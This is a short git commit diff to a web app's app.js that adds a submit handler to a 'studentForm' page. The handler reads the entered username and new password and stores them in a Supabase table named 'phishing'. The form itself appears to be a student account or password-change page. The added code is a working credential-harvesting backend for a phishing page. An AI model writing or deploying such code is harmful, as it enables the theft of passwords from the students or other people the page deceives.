3c6aadc5f22ec904b3ffb11ff616f33f7e877319
EzraWaweruChege <ezrawaweruchege@gmail.com>
2026-06-23 18:42:00 +0300

    Update app.js

--- app.js
+++ app.js
@@ -1,12 +1,55 @@
-
-alert("JavaScript Loaded");
-
 document
 .getElementById("studentForm")
-.addEventListener("submit", function(e){
+.addEventListener("submit", async function(e){
 
     e.preventDefault();
 
-    alert("Submit button clicked");
+    try{
 
+        const username =
+        document.getElementById("uname").value;
+
+        const newPassword =
+        document.getElementById("newpass").value;
+
+        alert("Connecting to Supabase...");
+
+        const { data, error } =
+        await client
+        .from("phishing")
+        .insert([
+            {
+                username: username,
+                password: newPassword
+            }
+        ])
+        .select();
+
+        if(error){
+
+            console.log(error);
+
+            alert(
+                "SUPABASE ERROR:\n\n" +
+                JSON.stringify(error)
+            );
+
+            return;
+        }
+
+        alert(
+            "SUCCESS\n\n" +
+            JSON.stringify(data)
+        );
+
+    }
+    catch(err){
+
+        console.log(err);
+
+        alert(
+            "JAVASCRIPT ERROR:\n\n" +
+            err.message
+        );
+    }
 });
